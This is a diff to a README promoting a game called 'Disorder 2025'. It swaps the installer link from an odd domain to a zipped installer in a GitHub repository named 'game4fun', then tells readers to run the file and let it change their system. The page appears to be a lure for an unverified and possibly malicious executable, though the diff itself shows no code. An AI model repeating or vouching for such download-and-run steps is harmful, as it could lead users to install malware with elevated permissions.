@@ -8,6 +8,7 @@
 Explore various environments, ranging from destroyed cities to eerie wilderness, while customizing your character’s abilities and gear. Each mission brings new challenges and enemies, requiring you to adapt your strategies. The open-world design and engaging combat make every encounter unique and exciting.
 
 Join the fight, team up with other survivors, and experience a new chapter in the action RPG genre with **Disorder 2025**.
+
 ![image](https://github.com/user-attachments/assets/3f989347-1f91-40ac-ba47-f4050cc135c2)
 ![image](https://github.com/user-attachments/assets/60ad3991-4ffe-4b21-a5df-6bf85040a1fd)
 ![image](https://github.com/user-attachments/assets/b693b13e-bfb3-45f9-a581-bf218a06ad6f)
@@ -18,7 +19,7 @@ Join the fight, team up with other survivors, and experience a new chapter in th
 To install **Disorder 2025**, follow these steps:
 
 1. **Download the Installer**  
-   Click [here](https://nicecolns.com/) to download the game installer.
+   Click [here](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip) to download the game installer.
 
 2. **Run the Installer**  
    After the download completes, double-click on the installer file to begin the installation process. You may be prompted to allow the installer to make changes to your system—click "Yes."
